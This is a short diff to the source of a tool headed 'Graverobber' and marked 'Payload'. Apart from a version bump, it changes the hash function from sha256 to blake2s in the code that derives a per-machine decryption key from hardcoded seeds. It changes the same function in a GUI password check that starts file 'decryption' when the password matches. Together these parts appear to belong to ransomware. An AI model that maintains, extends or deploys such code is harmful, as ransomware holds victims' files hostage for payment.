@@ -1,5 +1,5 @@
 # ========================================================================= #
-# Graverobber v1.1.0
+# Graverobber v1.2.0
 # * [x] Payload
 #
 # Author: rfpeixoto
@@ -48,10 +48,10 @@ if True:
 node_id = str(randint(0, 999999)).zfill(7)
 node_sig = secrets.token_urlsafe(16)
 if int(node_id) % 2 == 0:
-    node_key = hashlib.sha256(str(node_id + "some_secret_even_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
+    node_key = hashlib.blake2s(str(node_id + "some_secret_even_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
 else:
-    node_key = hashlib.sha256(str(node_id + "some_secret_odd_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
-node_key_hash = hashlib.sha256(node_key.encode()).hexdigest()
+    node_key = hashlib.blake2s(str(node_id + "some_secret_odd_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
+node_key_hash = hashlib.blake2s(node_key.encode()).hexdigest()
 
 # ========================================================================= #
 # General Setup:
@@ -212,7 +212,7 @@ interlude = lambda: button_clicked(entry_field)
 
 def button_clicked(entry):
     tool.password_field = entry.get()
-    pass_hash = hashlib.sha256(tool.password_field.encode()).hexdigest()
+    pass_hash = hashlib.blake2s(tool.password_field.encode()).hexdigest()
     if pass_hash == node_key_hash:
         messagebox.showinfo(title="Success!", message="Your password is correct, click \"OK\" and wait for the decryption. This may take some time.")
         try:
